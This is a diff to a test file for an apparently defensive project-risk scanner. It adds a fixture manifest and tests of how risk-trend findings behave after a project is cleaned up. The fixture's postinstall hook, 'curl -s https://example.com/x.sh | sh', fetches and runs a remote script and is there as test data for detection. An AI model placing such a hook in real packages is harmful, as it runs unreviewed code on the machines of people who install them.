@@ -85,6 +85,19 @@ function validTriageJson(): string {
   );
 }
 
+/** A manifest whose install hook pipes a download into a shell (score 75). */
+function writeRiskyManifest(): void {
+  fs.writeFileSync(
+    path.join(tmpDir, "package.json"),
+    JSON.stringify({
+      name: "demo-app",
+      version: "1.0.0",
+      dependencies: {},
+      scripts: { postinstall: "curl -s https://example.com/x.sh | sh" },
+    }),
+  );
+}
+
 function stateFile(name: string): string {
   return path.join(tmpDir, STATE_DIR, name);
 }
@@ -122,6 +135,9 @@ afterEach(() => {
 describe("risk history: the two cases that must never be confused", () => {
   it("control: an intact history still produces the trend findings", async () => {
     writeState("risk-history.json", validHistoryJson());
+    // The trend window ends with the current scan, so the project itself has
+    // to still be risky for a rising, stagnating trend to exist (score 75).
+    writeRiskyManifest();
     const report = await scan({ target: tmpDir, format: "json", noHistory: true });
 
     // If this control ever goes quiet, every "NONE" assertion below becomes
@@ -131,7 +147,23 @@ describe("risk history: the two cases that must never be confused", () => {
     expect(rulesOf(report)).toContain("RISK_STAGNATION_HIGH");
     expect(rulesOf(report)).not.toContain("RISK_HISTORY_UNREADABLE");
     expect(report.partialScan).toBeUndefined();
-    expect(getReportExitCode(report)).toBe(1);
+    // 2, not 1: the project's own critical install-hook findings decide it.
+    expect(getReportExitCode(report)).toBe(2);
+  });
+
+  it("a cleaned-up project is not told its risk stayed high", async () => {
+    // The same climbing history, but this scan finds nothing. The trend rules
+    // used to read the stored scans only, so the one scan that proved the
+    // cleanup reported RISK_STAGNATION_HIGH and RISK_TREND_INCREASING at high
+    // severity and exited 1 (measured on a real repository on 2026-09-30).
+    writeState("risk-history.json", validHistoryJson());
+    const report = await scan({ target: tmpDir, format: "json", noHistory: true });
+
+    expect(report.score).toBe(0);
+    expect(rulesOf(report)).not.toContain("RISK_TREND_INCREASING");
+    expect(rulesOf(report)).not.toContain("RISK_STAGNATION_HIGH");
+    expect(rulesOf(report)).not.toContain("RISK_TRAJECTORY_DEGRADING");
+    expect(getReportExitCode(report)).toBe(0);
   });
 
   it("an absent history is a first scan: silent, clean, exit 0", async () => {
